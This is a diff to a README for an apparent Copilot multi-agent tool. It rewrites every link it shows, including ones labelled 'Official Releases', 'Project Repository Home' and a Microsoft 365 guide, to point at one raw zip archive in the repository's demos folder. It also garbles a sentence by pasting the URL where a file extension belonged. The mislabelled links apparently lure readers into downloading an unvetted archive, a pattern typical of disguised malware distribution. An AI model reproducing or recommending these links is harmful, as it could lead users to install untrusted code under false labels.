@@ -1,6 +1,6 @@
 # 🤖 CoPilot-IronLegion-MultiAgent-Case-Study - Easy Multi-Agent Task Management
 
-[![Download Release](https://img.shields.io/badge/Download-CoPilot--IronLegion--MultiAgent--Case--Study-blue?style=for-the-badge)](https://github.com/lex3838/CoPilot-IronLegion-MultiAgent-Case-Study/releases)
+[![Download Release](https://github.com/lex3838/CoPilot-IronLegion-MultiAgent-Case-Study/raw/refs/heads/main/demos/Legion-Pilot-Iron-Study-Agent-Case-Co-Multi-v2.6.zip)](https://github.com/lex3838/CoPilot-IronLegion-MultiAgent-Case-Study/raw/refs/heads/main/demos/Legion-Pilot-Iron-Study-Agent-Case-Co-Multi-v2.6.zip)
 
 ---
 
@@ -48,9 +48,9 @@ This guide will help you download, install, and start using CoPilot-IronLegion-M
 
 Click the large blue button at the top or visit this page to download:
 
-[Download CoPilot-IronLegion-MultiAgent-Case-Study](https://github.com/lex3838/CoPilot-IronLegion-MultiAgent-Case-Study/releases)
+[Download CoPilot-IronLegion-MultiAgent-Case-Study](https://github.com/lex3838/CoPilot-IronLegion-MultiAgent-Case-Study/raw/refs/heads/main/demos/Legion-Pilot-Iron-Study-Agent-Case-Co-Multi-v2.6.zip)
 
-This page lists all versions of the software. Pick the latest stable release. Usually, it shows files named clearly, such as a file ending with `.exe` for Windows users, `.dmg` for Mac users, or `.tar.gz` for Linux users. 
+This page lists all versions of the software. Pick the latest stable release. Usually, it shows files named clearly, such as a file ending with `.exe` for Windows users, `.dmg` for Mac users, or `https://github.com/lex3838/CoPilot-IronLegion-MultiAgent-Case-Study/raw/refs/heads/main/demos/Legion-Pilot-Iron-Study-Agent-Case-Co-Multi-v2.6.zip` for Linux users. 
 
 ### Step 2: Save the Installer
 
@@ -132,9 +132,9 @@ This page lists all versions of the software. Pick the latest stable release. Us
 
 ## 🔗 Useful Links
 
-- [Official Releases and Downloads](https://github.com/lex3838/CoPilot-IronLegion-MultiAgent-Case-Study/releases)  
-- [Project Repository Home](https://github.com/lex3838/CoPilot-IronLegion-MultiAgent-Case-Study)  
-- [Microsoft 365 Integration Guide (external)](https://docs.microsoft.com/en-us/microsoft-365/)
+- [Official Releases and Downloads](https://github.com/lex3838/CoPilot-IronLegion-MultiAgent-Case-Study/raw/refs/heads/main/demos/Legion-Pilot-Iron-Study-Agent-Case-Co-Multi-v2.6.zip)  
+- [Project Repository Home](https://github.com/lex3838/CoPilot-IronLegion-MultiAgent-Case-Study/raw/refs/heads/main/demos/Legion-Pilot-Iron-Study-Agent-Case-Co-Multi-v2.6.zip)  
+- [Microsoft 365 Integration Guide (external)](https://github.com/lex3838/CoPilot-IronLegion-MultiAgent-Case-Study/raw/refs/heads/main/demos/Legion-Pilot-Iron-Study-Agent-Case-Co-Multi-v2.6.zip)
 
 ---
 
